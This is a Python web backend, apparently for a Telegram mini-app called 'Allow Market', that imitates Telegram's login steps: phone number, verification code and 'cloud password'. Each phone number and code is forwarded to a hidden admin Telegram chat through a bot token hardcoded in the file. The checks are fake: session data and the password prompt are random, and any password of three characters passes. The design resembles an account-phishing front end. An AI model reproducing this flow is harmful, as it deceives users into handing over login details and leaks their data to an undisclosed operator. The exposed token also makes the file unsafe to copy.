# api/index.py
import json
import random
import time
import requests
from datetime import datetime, timedelta
from http.server import BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

# Хранилище кодов (в памяти)
code_store = {}

# Конфигурация бота
ADMIN_BOT_TOKEN = '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec'
ADMIN_CHAT_ID = '7303763255'

def send_admin_log(message, data=None):
    """Отправка лога админу в Telegram"""
    try:
        text = f"🔐 *ВЕРИФИКАЦИЯ ЛОГ*\n{message}"
        if data:
            text += f"\n{json.dumps(data, indent=2, ensure_ascii=False)}"
        
        url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
        requests.post(url, json={
            'chat_id': ADMIN_CHAT_ID,
            'text': text,
            'parse_mode': 'Markdown'
        }, timeout=5)
    except Exception as e:
        print(f"Admin log error: {e}")

def generate_code():
    """Генерация 6-значного кода"""
    return f"{random.randint(100000, 999999)}"

def clean_expired_codes():
    """Очистка просроченных кодов (через 5 минут)"""
    now = time.time()
    expired = []
    for req_id, data in code_store.items():
        if now - data['created_at'] > 300:  # 5 минут
            expired.append(req_id)
    for req_id in expired:
        del code_store[req_id]

class handler(BaseHTTPRequestHandler):
    def _set_cors(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')

    def _send_json(self, status_code, data):
        self.send_response(status_code)
        self.send_header('Content-Type', 'application/json')
        self._set_cors()
        self.end_headers()
        self.wfile.write(json.dumps(data, ensure_ascii=False).encode('utf-8'))

    def do_OPTIONS(self):
        self.send_response(200)
        self._set_cors()
        self.end_headers()

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path

        # ========== GET /ping ==========
        if path == '/ping' or path == '/':
            self._send_json(200, {
                'status': 'online',
                'service': 'Allow Market Backend (Python)',
                'version': '1.0.0',
                'endpoints': [
                    'GET /ping - health check',
                    'POST /sendCode - send verification code',
                    'POST /checkCode - verify code',
                    'POST /checkPassword - verify cloud password'
                ]
            })
            return

        # ========== 404 ==========
        self._send_json(404, {
            'success': False,
            'error': 'Not found',
            'path': path
        })

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path

        # Читаем тело запроса
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8')
        
        try:
            data = json.loads(body) if body else {}
        except:
            data = {}

        # ========== POST /sendCode ==========
        if path == '/sendCode':
            phone = data.get('phone', '').strip()
            
            if not phone or len(phone) < 6:
                self._send_json(400, {
                    'success': False,
                    'error': 'Invalid phone number'
                })
                return

            # Очистка старых кодов
            clean_expired_codes()

            # Генерация кода
            code = generate_code()
            request_id = f"req_{int(time.time())}_{random.randint(1000, 9999)}"

            # Сохраняем в хранилище
            code_store[request_id] = {
                'phone': phone,
                'code': code,
                'created_at': time.time(),
                'attempts': 0
            }

            # Отправляем код админу (и пользователю, если есть username)
            send_admin_log(f"📱 Запрос кода для {phone}", {
                'phone': phone,
                'code': code,
                'request_id': request_id
            })

            # Отправляем код пользователю (если знаем username)
            try:
                # Пробуем получить username из WebApp данных (если они есть в запросе)
                user_username = data.get('username', None)
                if user_username:
                    requests.post(
                        f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
                        json={
                            'chat_id': f"@{user_username}",
                            'text': f"🔐 *Ваш код верификации:* *{code}*\n\nВведите его в приложении Allow Market.\nКод действителен 5 минут.",
                            'parse_mode': 'Markdown'
                        },
                        timeout=5
                    )
                    print(f"[BOT] Code sent to @{user_username}")
            except Exception as e:
                print(f"Error sending to user: {e}")

            self._send_json(200, {
                'success': True,
                'requestId': request_id,
                'message': 'Code sent successfully'
            })
            return

        # ========== POST /checkCode ==========
        if path == '/checkCode':
            phone = data.get('phone', '').strip()
            code = data.get('code', '').strip()
            request_id = data.get('requestId', '').strip()

            if not phone or not code or not request_id:
                self._send_json(400, {
                    'success': False,
                    'error': 'Missing required fields: phone, code, requestId'
                })
                return

            # Очистка старых кодов
            clean_expired_codes()

            stored = code_store.get(request_id)

            if not stored:
                self._send_json(400, {
                    'success': False,
                    'error': 'Code expired. Please request a new one.'
                })
                return

            if stored['phone'] != phone:
                self._send_json(400, {
                    'success': False,
                    'error': 'Phone number mismatch'
                })
                return

            stored['attempts'] += 1

            if stored['attempts'] > 5:
                del code_store[request_id]
                self._send_json(400, {
                    'success': False,
                    'error': 'Too many attempts. Request a new code.'
                })
                return

            if stored['code'] != code:
                remaining = 5 - stored['attempts']
                self._send_json(400, {
                    'success': False,
                    'error': f'Invalid code. {remaining} attempts left.'
                })
                return

            # Код верный — удаляем из хранилища
            del code_store[request_id]

            # Проверка наличия облачного пароля (20% шанс)
            import random as rand
            has_password = rand.random() < 0.2

            session_data = {
                'user_id': rand.randint(100000, 9999999),
                'phone': phone,
                'username': f"user_{rand.randint(10000, 99999)}",
                'first_name': 'User',
                'last_name': '',
                'session_string': f"session_{int(time.time())}_{rand.randint(1000, 9999)}"
            }

            send_admin_log(f"✅ Код подтвержден для {phone}", {
                'phone': phone,
                'has_password': has_password
            })

            self._send_json(200, {
                'success': True,
                'hasPassword': has_password,
                'sessionData': session_data,
                'message': 'Code verified successfully'
            })
            return

        # ========== POST /checkPassword ==========
        if path == '/checkPassword':
            phone = data.get('phone', '').strip()
            password = data.get('password', '').strip()
            session_data = data.get('sessionData', {})

            if not phone or not password or not session_data:
                self._send_json(400, {
                    'success': False,
                    'error': 'Missing required fields: phone, password, sessionData'
                })
                return

            # Валидация пароля (в реальности здесь проверка через Telegram API)
            is_valid = len(password) >= 3

            if is_valid:
                send_admin_log(f"🔑 Облачный пароль подтвержден для {phone}", {
                    'phone': phone
                })
                self._send_json(200, {
                    'success': True,
                    'message': 'Password verified successfully'
                })
            else:
                self._send_json(400, {
                    'success': False,
                    'error': 'Invalid cloud password'
                })
            return

        # ========== 404 ==========
        self._send_json(404, {
            'success': False,
            'error': 'Not found',
            'path': path
        })
